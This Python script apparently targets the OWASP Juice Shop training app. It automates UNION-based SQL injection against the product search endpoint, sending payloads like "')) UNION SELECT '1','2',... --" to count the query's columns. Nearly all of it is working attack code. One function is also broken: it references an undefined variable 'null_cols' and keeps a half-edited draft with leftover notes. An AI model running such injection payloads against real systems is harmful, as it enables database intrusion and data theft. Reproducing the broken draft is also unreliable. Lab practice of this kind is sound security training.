from core.client import JuiceShopClient
from loguru import logger

client = JuiceShopClient()

def find_columns(table_name):
    logger.info(f"Finding columns for {table_name}...")
    for i in range(1, 25):
        nulls = ", ".join([f"'{j}'" for j in range(i)])
        # Query: SELECT * FROM Products WHERE ((name LIKE '%...'))
        # Injection: ')) UNION SELECT '1', '2', ... FROM table --
        # Total columns in SELECT MUST match total columns in Products.
        # Products has N columns. 
        # Our SELECT has 'i' columns.
        # So i must be N.
        
        payload = f"')) UNION SELECT {null_cols if i > 1 else ''} FROM {table_name} --"
        # Wait, if i columns, we need i values.
        vals = ", ".join([f"'{j}'" for j in range(1, i + 1)])
        payload = f"')) UNION SELECT {vals} FROM {table_name} --"
        
        res = client.get("/rest/products/search", params={"q": payload})
        if res.status_code == 200:
            logger.success(f"Table {table_name} has {i} columns!")
            return i
    return None

def find_null_cols(table_name):
    for i in range(1, 20):
        vals = ", ".join([f"'{j}'" for j in range(1, i + 1)])
        payload = f"')) UNION SELECT {vals} --"
        res = client.get("/rest/products/search", params={"q": payload})
        if res.status_code == 200:
             logger.success(f"Product search SQL has {i} columns.")
             return i
    return None

find_null_cols("Products")
